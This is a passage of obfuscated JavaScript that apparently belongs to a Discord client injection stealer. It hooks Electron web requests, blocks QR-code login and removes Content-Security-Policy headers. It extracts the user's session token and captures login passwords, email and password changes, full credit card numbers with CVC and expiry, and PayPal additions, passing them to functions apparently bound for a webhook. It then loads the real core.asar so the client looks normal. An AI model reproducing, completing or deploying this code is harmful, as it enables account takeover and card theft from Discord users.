  hooker(_0x497d31);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (_0xfe248a, _0x552d16) => {
  if (_0xfe248a.url.startsWith("wss://remote-auth-gateway")) {
    return _0x552d16({
      'cancel': true
    });
  }
  updateCheck();
});
session.defaultSession.webRequest.onHeadersReceived((_0x300a6f, _0x2c4af1) => {
  if (_0x300a6f.url.startsWith("%WEBHOOK%")) {
    if (_0x300a6f.url.includes("discord.com")) {
      _0x2c4af1({
        'responseHeaders': Object.assign({
          'Access-Control-Allow-Headers': '*'
        }, _0x300a6f.responseHeaders)
      });
    } else {
      _0x2c4af1({
        'responseHeaders': Object.assign({
          'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
          'Access-Control-Allow-Headers': '*',
          'Access-Control-Allow-Origin': '*'
        }, _0x300a6f.responseHeaders)
      });
    }
  } else {
    delete _0x300a6f.responseHeaders["content-security-policy"];
    delete _0x300a6f.responseHeaders["content-security-policy-report-only"];
    _0x2c4af1({
      'responseHeaders': {
        ..._0x300a6f.responseHeaders,
        'Access-Control-Allow-Headers': '*'
      }
    });
  }
});
session.defaultSession.webRequest.onCompleted(config.filter, async (_0x5ad42f, _0x164039) => {
  if (_0x5ad42f.statusCode !== 200 && _0x5ad42f.statusCode !== 202) {
    return;
  }
  const _0x44b343 = Buffer.from(_0x5ad42f.uploadData[0].bytes).toString();
  const _0x28b2a9 = JSON.parse(_0x44b343);
  const _0x4ea9c3 = await execScript("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()");
  switch (true) {
    case _0x5ad42f.url.endsWith("login"):
      login(_0x28b2a9.login, _0x28b2a9.password, _0x4ea9c3)["catch"](console.error);
      break;
    case _0x5ad42f.url.endsWith("users/@me") && _0x5ad42f.method === "PATCH":
      if (!_0x28b2a9.password) {
        return;
      }
      if (_0x28b2a9.email) {
        emailChanged(_0x28b2a9.email, _0x28b2a9.password, _0x4ea9c3)["catch"](console.error);
      }
      if (_0x28b2a9.new_password) {
        passwordChanged(_0x28b2a9.password, _0x28b2a9.new_password, _0x4ea9c3)["catch"](console.error);
      }
      break;
    case _0x5ad42f.url.endsWith("tokens") && _0x5ad42f.method === "POST":
      const _0x5da10e = querystring.parse(unparsedData.toString());
      ccAdded(_0x5da10e["card[number]"], _0x5da10e["card[cvc]"], _0x5da10e["card[exp_month]"], _0x5da10e["card[exp_year]"], _0x4ea9c3)["catch"](console.error);
      break;
    case _0x5ad42f.url.endsWith("paypal_accounts") && _0x5ad42f.method === "POST":
      PaypalAdded(_0x4ea9c3)["catch"](console.error);
      break;
    case _0x5ad42f.url.endsWith("confirm") && _0x5ad42f.method === "POST":
      return;
      setTimeout(() => {
        nitroBought(_0x4ea9c3)["catch"](console.error);
      }, 7500);
      break;
    default:
      break;
  }
});
module.exports = require("./core.asar");
